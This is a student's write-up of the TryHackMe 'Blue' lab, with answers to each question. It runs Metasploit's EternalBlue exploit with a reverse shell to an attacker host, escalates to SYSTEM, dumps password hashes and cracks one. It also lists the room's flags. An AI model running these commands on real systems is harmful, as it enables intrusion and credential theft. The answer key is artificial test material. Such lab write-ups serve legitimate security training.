# Blue
Deploy and hack into a Windows machine, leveraging common misconfiguration issues.

## Content:
<br>[Task 1: Recon](#task-1-recon)
<br>[Task 2: Gain Access](#task-2-gain-access)
<br>[Task 3: Escalate](#task-3-escalate)
<br>[Task 4: Cracking](#task-4-cracking)
<br>[Task 5: Find flags!](#task-5-find-flags)
<br>[To note](#to-note)

## Task 1: Recon
<u><b>THM Questions</b></u>
| Question | Answer |
|---------|---------|
| <i>How many ports are open with a port number under 1000?</i><br>3 | `nmap -p 0-1000 <victim_IP>` |
| <i>What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)</i><br>ms17-010 | `nmap -p 445 --script=smb-vuln-ms17-010 <victim_IP>` |

## Task 2: Gain Access
<u><b>THM Questions</b></u>
| Question | Answer |
|---------|---------|
| <i>Start Metasploit</i><br>3 | `msfconsole` |
| <i>Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)</i><br>exploit/windows/smb/ms17_010_eternalblue | `search type:exploit ms17-010` |
| <i>Show options and set the one required value. What is the name of this value? (All caps for submission)</i><br>RHOSTSset rhosts  | `use 0`<br>`show options`<br>`set rhosts <victim_IP>` |
| <i>Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:</i> | `set payload windows/x64/shell/reverse_tcp` |
| <i>With that done, run the exploit!</i> | `run` |
| <i>Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.</i> | |

## Task 3: Escalate
<u><b>THM Questions</b></u>
| Question | Answer |
|---------|---------|
| <i>If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)</i><br>post/multi/manage/shell_to_meterpreter | `CTRL+Z`<br>`y`<br>`Enter` |
| <i>Select this (use MODULE_PATH). Show options, what option are we required to change?</i><br>SESSION | `show options` |
| <i>Set the required option, you may need to list all of the sessions to find your target here.</i> | `sessions -l`<br>`set session 1`<br>`set lhost <attacker_IP>` |
| <i>Run! If this doesn't work, try completing the exploit from the previous task once more.</i> | `run`<br>After Meterpreter session opens and you see 'Stopping exploit/multi/handler', `Enter`. |
| <i>Once the meterpreter shell conversion completes, select that session for use.</i> | `sessions -l`<br>`sessions -i 2`|
| <i>Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.</i> | `getuid`<br><br>or `getsystem`<br><br>or `shell`<br>`whoami`<br>`Ctrl+Z`<br>`y`|
| <i>List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).</i><br>(Migrate to a more stable process; match the architecture.) 1296 | `migrate 1296`<br>To check if privilege level is the same: `getuid` |

## Task 4: Cracking
<u><b>THM Questions</b></u>
| Question | Answer |
|---------|---------|
| <i>Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?</i><br>Jon | `hashdump` |
| <i>Copy this password hash to a file and research how to crack it. What is the cracked password?</i><br>alqfna22 | Used [this](https://hashes.com/en/decrypt/hash). |

## Task 5: Find flags!
<u><b>THM Questions</b></u>
| Question | Answer |
|---------|---------|
| <i>Flag1? This flag can be found at the system root.</i><br>flag{access_the_machine} | `pwd` to show C:\Windows\system32<br>`cd ..` x2 to get to C:\ <br>`ls`<br>`cat flag1.txt` |
| <i>Flag2? This flag can be found at the location where passwords are stored within Windows.</i><br>flag{sam_database_elevated_access} | `cd Windows\\System32\\config`<br>`ls`<br>`cat flag2.txt` |
| <i>flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.</i><br>flag{admin_documents_can_be_valuable} | `cd C:\\users\\Jon\\Documents`<br>`ls`<br>`cat flag3.txt` |

## To note
<ul>
<li><b>Why do we need to set payload for EternalBlue?</b> EternalBlue is only the break-in mechanism; exploit only gives a place to run code on victim and does not automatically include a shell or Meterpreter.<ul><li>Need to supply the code to run, which is the payload.</li><li>This payload gives you the session; in this case, it is a simple command prompt reverse shell.</li><li>Since EternalBlue targets: (1) SMBv1 driver (2) in 64-bit Windows kernels, we need to use a 64-bit Windows payload.</li><li>We use a reverse_tcp because: (1) Most firewalls block incoming connections. (2) But the target can usually make outbound connections, so the victim calls back to your attacking machine.</li></ul></li>
<li><b>To reset options to default:</b> <code>unset <_option_name></code></li>
<li><b>Difference between Meterpreter and using 'shell' in Meterpreter:</b><ul><li>Meterpreter is a custom, in-mem Metasploit agent written in C/ASM and extended by scripts. It is NOT the Windows command prompt; when typing commands in Meterpreter, they are NOT Windows commands.</li><li>Also NOT Linux commands; they are Meterpreter's own command set. Just look like Linux commands because Meterpreter uses a UNIX-like syntax, but Meterpreter translates them into Windows API under the hood.</li><li>When running 'shell', you are dropping into the actual Windows command shell (cmd.exe). Commands here must be avlid Windows commands.</li></ul></li>
</ul>